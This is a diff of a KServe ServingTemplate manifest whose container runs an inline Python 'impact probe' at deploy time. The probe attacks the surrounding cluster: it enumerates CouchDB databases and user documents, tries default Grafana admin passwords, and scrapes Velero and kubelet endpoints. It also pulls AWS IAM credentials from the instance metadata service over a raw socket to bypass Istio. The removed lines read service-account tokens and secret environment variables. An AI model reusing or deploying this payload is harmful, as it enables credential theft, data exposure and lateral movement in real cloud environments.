@@ -1,14 +1,14 @@
 apiVersion: ai.sap.com/v1alpha1
 kind: ServingTemplate
 metadata:
-  name: rce-probe-diag
+  name: impact-probe
   labels:
-    scenarios.ai.sap.com/id: "rce-probe-diag"
+    scenarios.ai.sap.com/id: "impact-probe-v1"
     ai.sap.com/version: "1.0.0"
   annotations:
-    scenarios.ai.sap.com/name: "rce-probe-diag"
-    executables.ai.sap.com/description: "sa-token-diag-altpath-mountinfo"
-    executables.ai.sap.com/name: "rce-probe-diag"
+    scenarios.ai.sap.com/name: "impact-probe-v1"
+    executables.ai.sap.com/name: "impact-probe"
+    executables.ai.sap.com/description: "impact verification probe"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -21,106 +21,265 @@ spec:
       predictor:
         minReplicas: 1
         maxReplicas: 1
-        volumes:
-        - name: kube-api-access
-          projected:
-            defaultMode: 420
-            sources:
-            - serviceAccountToken:
-                expirationSeconds: 3600
-                path: token
-                audience: kubernetes
-            - configMap:
-                items:
-                - key: ca.crt
-                  path: ca.crt
-                name: kube-root-ca.crt
-            - downwardAPI:
-                items:
-                - fieldRef:
-                    apiVersion: v1
-                    fieldPath: metadata.namespace
-                  path: namespace
         containers:
         - name: kserve-container
           image: python:3.11
           command: ["/bin/sh", "-c"]
-          volumeMounts:
-          - mountPath: /tmp/sa-diag
-            name: kube-api-access
-            readOnly: true
           args:
           - |
-            python3 -c "
-            import os, socket, ssl, json, select, struct
+            cat > /tmp/probe.py << 'PYEOF'
+            import os, ssl, socket, json, re, base64
+            import urllib.request, urllib.error
 
-            print('[PROBE_V417_START]', flush=True)
+            def report(k, v):
+                print(f"[PROBE] {k}: {str(v)[:4000]}", flush=True)
 
-            def emit(label, data):
-                flat = str(data).replace('\r\n','|').replace('\r','|').replace('\n','|')
-                for i in range(0, max(1, len(flat)), 4000):
-                    print(f'[{label}_{i}] {flat[i:i+4000]}', flush=True)
-
-            # ── 1. Check alternative mount path /tmp/sa-diag ─────────────────────
-            for path in [
-                '/tmp/sa-diag',
-                '/var/run/secrets/kubernetes.io/serviceaccount',
-                '/var/run/secrets/kubernetes.io',
-                '/var/run/secrets',
-                '/run/secrets',
-            ]:
+            def http_get(url, headers=None, timeout=8):
                 try:
-                    contents = os.listdir(path)
-                    emit(f'DIR_{path.replace(\"/\",\"_\")}', str(contents))
-                    for f in contents:
-                        try:
-                            with open(f'{path}/{f}') as fh:
-                                d = fh.read(400)
-                            label = f'{path.replace(\"/\",\"_\")}_{f.replace(\".\",\"_\")}'
-                            emit(f'FILE_{label}', d if f != 'token' else f'len={len(d)} pre={d[:60]}')
-                        except Exception as e2:
-                            emit(f'FILE_ERR_{path.replace(\"/\",\"_\")}_{f}', str(e2))
+                    req = urllib.request.Request(url, headers=headers or {})
+                    ctx = ssl.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                    with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
+                        return r.read().decode("utf-8", errors="replace"), r.status
+                except urllib.error.HTTPError as e:
+                    body = ""
+                    try: body = e.read().decode("utf-8", errors="replace")[:500]
+                    except: pass
+                    return f"HTTP_{e.code}:{body}", e.code
                 except Exception as e:
-                    emit(f'DIR_MISS_{path.replace(\"/\",\"_\")}', str(e))
+                    return f"ERR:{e}", 0
 
-            # ── 2. /proc/self/mountinfo ───────────────────────────────────────────
-            try:
-                with open('/proc/self/mountinfo') as f:
-                    emit('MOUNTINFO', f.read())
-            except Exception as e:
-                emit('MOUNTINFO_ERR', str(e))
-
-            # ── 3. Environment variables (K8s-related) ────────────────────────────
-            relevant_env = {k: v for k, v in os.environ.items()
-                            if any(x in k.upper() for x in
-                                   ['TOKEN','SECRET','KUBE','K8S','SA_','SERVICE_ACCOUNT'])}
-            emit('ENV_K8S', str(relevant_env))
-
-            # ── 4. Etcd TLS (for comparison with v4.14.0) ────────────────────────
-            for sip in ['10.250.0.1','10.250.0.2','10.250.0.3']:
+            def http_put(url, headers=None, timeout=8):
                 try:
-                    s = socket.socket(); s.settimeout(10)
-                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
-                    s = ctx.wrap_socket(s, server_hostname=sip)
-                    s.connect((sip, 2379))
-                    s.sendall(b'GET /health HTTP/1.1\r\nHost: ' + sip.encode() + b':2379\r\nConnection: close\r\n\r\n')
-                    resp = b''
+                    req = urllib.request.Request(url, method="PUT", headers=headers or {}, data=b"")
+                    ctx = ssl.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                    with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
+                        return r.read().decode("utf-8", errors="replace"), r.status
+                except urllib.error.HTTPError as e:
+                    body = ""
+                    try: body = e.read().decode("utf-8", errors="replace")[:200]
+                    except: pass
+                    return f"HTTP_{e.code}:{body}", e.code
+                except Exception as e:
+                    return f"ERR:{e}", 0
+
+            def raw_tcp_http(host, port, request_str, timeout=6):
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(timeout)
+                    s.connect((host, port))
+                    s.sendall(request_str.encode())
+                    resp = b""
                     while True:
-                        c = s.recv(4096)
-                        if not c: break
-                        resp += c
+                        chunk = s.recv(4096)
+                        if not chunk: break
+                        resp += chunk
                     s.close()
-                    emit(f'ETCD_TLS_{sip}', resp[:300].decode(errors='replace'))
+                    return resp.decode("utf-8", errors="replace")
                 except Exception as e:
-                    emit(f'ETCD_TLS_ERR_{sip}', str(e))
+                    return f"ERR:{e}"
 
-            print('[PROBE_V417_DONE]', flush=True)
-            " 2>&1
+            # ── RCE BANNER ─────────────────────────────────────────────────────────
+            report("HOSTNAME", os.uname().nodename)
+            report("K8S_API_HOST", os.environ.get("KUBERNETES_SERVICE_HOST", "none"))
+            egress, _ = http_get("https://ifconfig.me/ip", timeout=5)
+            report("EGRESS_IP", egress)
+
+            # ── IMPACT 3a: COUCHDB ─────────────────────────────────────────────────
+            report("---", "=== COUCHDB ===")
+            couch_candidates = [
+                "http://couchdb-couchdb.couchdb.svc.cluster.local:5984",
+                "http://couchdb-svc.couchdb.svc.cluster.local:5984",
+                "http://couchdb.couchdb.svc.cluster.local:5984",
+                "http://couchdb-ha.couchdb.svc.cluster.local:5984",
+                "http://couchdb-couchdb-0.couchdb-couchdb.couchdb.svc.cluster.local:5984",
+            ]
+            couch_base = None
+            for cb in couch_candidates:
+                body, code = http_get(f"{cb}/", timeout=5)
+                report(f"COUCH_WELCOME", f"[{code}] {cb} => {body[:300]}")
+                if code == 200 and "couchdb" in body.lower():
+                    couch_base = cb
+                    break
+
+            if couch_base:
+                for path, label in [
+                    ("/_all_dbs",          "ALL_DBS"),
+                    ("/_session",          "SESSION"),
+                    ("/_membership",       "MEMBERSHIP"),
+                    ("/_node/_local/_config", "CONFIG"),
+                    ("/_users/_all_docs",  "USERS"),
+                    ("/_security",         "SECURITY"),
+                ]:
+                    body, code = http_get(f"{couch_base}{path}", timeout=5)
+                    report(f"COUCH_{label}", f"[{code}] {body[:600]}")
+
+                try:
+                    dbs_raw, dbs_code = http_get(f"{couch_base}/_all_dbs", timeout=5)
+                    if dbs_code == 200:
+                        dbs = json.loads(dbs_raw)
+                        for db in dbs[:8]:
+                            b2, c2 = http_get(f"{couch_base}/{db}/_all_docs?limit=5", timeout=5)
+                            report(f"COUCH_DB_DOCS_{db}", f"[{c2}] {b2[:500]}")
+                except Exception as e:
+                    report("COUCH_DB_ITER_ERR", str(e))
+            else:
+                report("COUCH_RESULT", "no CouchDB endpoint reachable")
+
+            # ── IMPACT 3b: GRAFANA ─────────────────────────────────────────────────
+            report("---", "=== GRAFANA ===")
+            grafana_candidates = [
+                "http://grafana-service.grafana.svc.cluster.local:3000",
+                "http://grafana.grafana.svc.cluster.local:3000",
+                "http://monitoring-grafana.monitoring.svc.cluster.local:3000",
+                "http://100.64.0.46:3000",
+            ]
+            grafana_base = None
+            for gb in grafana_candidates:
+                body, code = http_get(f"{gb}/api/health", timeout=5)
+                report(f"GRAFANA_HEALTH", f"[{code}] {gb} => {body[:300]}")
+                if code == 200:
+                    grafana_base = gb
+                    break
+
+            if grafana_base:
+                body, code = http_get(f"{grafana_base}/api/org", timeout=5)
+                report("GRAFANA_ORG_NOAUTH", f"[{code}] {body[:300]}")
+
+                body, code = http_get(f"{grafana_base}/api/frontend/settings", timeout=5)
+                report("GRAFANA_SETTINGS_NOAUTH", f"[{code}] {body[:500]}")
+
+                for creds in ["admin:admin", "admin:password", "admin:grafana", "admin:changeme", "admin:secret"]:
+                    enc = base64.b64encode(creds.encode()).decode()
+                    body, code = http_get(f"{grafana_base}/api/org",
+                                          headers={"Authorization": f"Basic {enc}"}, timeout=5)
+                    report(f"GRAFANA_AUTH_{creds}", f"[{code}] {body[:200]}")
+                    if code == 200:
+                        report("GRAFANA_AUTH_SUCCESS", creds)
+                        for ep in ["/api/datasources", "/api/search", "/api/users", "/api/admin/settings"]:
+                            b2, c2 = http_get(f"{grafana_base}{ep}",
+                                              headers={"Authorization": f"Basic {enc}"}, timeout=5)
+                            report(f"GRAFANA_AUTH_{ep.replace('/','_')}", f"[{c2}] {b2[:800]}")
+                        break
+            else:
+                report("GRAFANA_RESULT", "no Grafana endpoint reachable")
+
+            # ── IMPACT 3c: VELERO ─────────────────────────────────────────────────
+            report("---", "=== VELERO ===")
+            velero_candidates = [
+                ("http://velero.velero.svc.cluster.local:8085",  "metrics"),
+                ("http://velero.velero.svc.cluster.local:11000", "debug"),
+                ("http://velero.velero.svc.cluster.local:8080",  "api"),
+                ("http://100.64.85.21:8085",                     "direct-metrics"),
+                ("http://100.64.85.21:11000",                    "direct-debug"),
+            ]
+            for vurl, vlabel in velero_candidates:
+                body, code = http_get(vurl, timeout=6)
+                report(f"VELERO_{vlabel}", f"[{code}] {body[:400]}")
+                if code == 200 and len(body) > 50:
+                    ns_hits = re.findall(r'namespace="([^"]+)"', body)
+                    bk_hits = re.findall(r'schedule="([^"]+)"', body)
+                    report(f"VELERO_{vlabel}_NAMESPACES", str(sorted(set(ns_hits))[:30]))
+                    report(f"VELERO_{vlabel}_SCHEDULES", str(sorted(set(bk_hits))[:20]))
+                    backup_lines = [l for l in body.split("\n")
+                                    if "backup" in l.lower() and not l.startswith("#")]
+                    report(f"VELERO_{vlabel}_BACKUP_METRICS", "\n".join(backup_lines[:40]))
+
+            # ── IMPACT 4a: IMDSv2 (raw socket to bypass Istio) ────────────────────
+            report("---", "=== IMDSv2 ===")
+            raw_put = raw_tcp_http(
+                "169.254.169.254", 80,
+                "PUT /latest/api/token HTTP/1.1\r\n"
+                "Host: 169.254.169.254\r\n"
+                "X-aws-ec2-metadata-token-ttl-seconds: 21600\r\n"
+                "Content-Length: 0\r\n"
+                "Connection: close\r\n\r\n"
+            )
+            report("IMDS_RAW_PUT", raw_put[:300])
+
+            imds_token = None
+            if "\r\n\r\n" in raw_put:
+                token_candidate = raw_put.split("\r\n\r\n", 1)[-1].strip()
+                if len(token_candidate) > 10 and "ERR" not in token_candidate:
+                    imds_token = token_candidate
+                    report("IMDS_TOKEN_GOT", f"len={len(imds_token)}")
+
+            if imds_token:
+                for path in [
+                    "iam/security-credentials/",
+                    "instance-id",
+                    "instance-type",
+                    "hostname",
+                    "placement/region",
+                    "placement/availability-zone",
+                    "network/interfaces/macs/",
+                ]:
+                    body, code = http_get(
+                        f"http://169.254.169.254/latest/meta-data/{path}",
+                        headers={"X-aws-ec2-metadata-token": imds_token}, timeout=5)
+                    report(f"IMDS_{path.replace('/','_').rstrip('_')}", f"[{code}] {body[:300]}")
+
+                # if IAM role name found, fetch creds
+                iam_body, iam_code = http_get(
+                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                    headers={"X-aws-ec2-metadata-token": imds_token}, timeout=5)
+                if iam_code == 200 and not iam_body.startswith("ERR") and not iam_body.startswith("HTTP_"):
+                    role = iam_body.strip().splitlines()[0].strip()
+                    creds_body, creds_code = http_get(
+                        f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}",
+                        headers={"X-aws-ec2-metadata-token": imds_token}, timeout=5)
+                    report("IMDS_IAM_CREDS", f"[{creds_code}] role={role} => {creds_body[:500]}")
+            else:
+                report("IMDS_RESULT", "token not obtained via raw socket; trying urllib PUT")
+                body, code = http_put(
+                    "http://169.254.169.254/latest/api/token",
+                    headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"}, timeout=5)
+                report("IMDS_urllib_PUT", f"[{code}] {body[:200]}")
+
+            # ── IMPACT 4b: KUBELET ─────────────────────────────────────────────────
+            report("---", "=== KUBELET ===")
+            node_ips = ["10.180.1.74", "10.180.12.215", "10.180.13.45", "10.180.35.242"]
+            kubelet_paths = ["/pods", "/runningpods", "/metrics", "/metrics/cadvisor", "/spec"]
+            for node_ip in node_ips[:2]:
+                for path in kubelet_paths:
+                    body, code = http_get(f"https://{node_ip}:10250{path}", timeout=6)
+                    report(f"KUBELET_{node_ip}{path.replace('/','_')}", f"[{code}] {body[:300]}")
+                    if code == 200 and path == "/pods":
+                        try:
+                            pods = json.loads(body)
+                            items = pods.get("items", [])
+                            report(f"KUBELET_{node_ip}_pods_count", str(len(items)))
+                            for it in items[:5]:
+                                meta = it.get("metadata", {})
+                                report(f"KUBELET_pod", f"{meta.get('namespace')}/{meta.get('name')}")
+                        except: pass
+
+            report("DONE", "all impact probes complete")
+            PYEOF
+            python3 /tmp/probe.py 2>&1
             python3 -c "
             import http.server
             class H(http.server.BaseHTTPRequestHandler):
-                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
+                def do_GET(self):
+                    self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                 def log_message(self, *a): pass
             http.server.HTTPServer(('', 8080), H).serve_forever()
             "
+          ports:
+          - containerPort: 8080
+            protocol: TCP
+          readinessProbe:
+            httpGet:
+              path: /
+              port: 8080
+            initialDelaySeconds: 30
+            periodSeconds: 10
+          livenessProbe:
+            httpGet:
+              path: /
+              port: 8080
+            initialDelaySeconds: 30
+            periodSeconds: 15
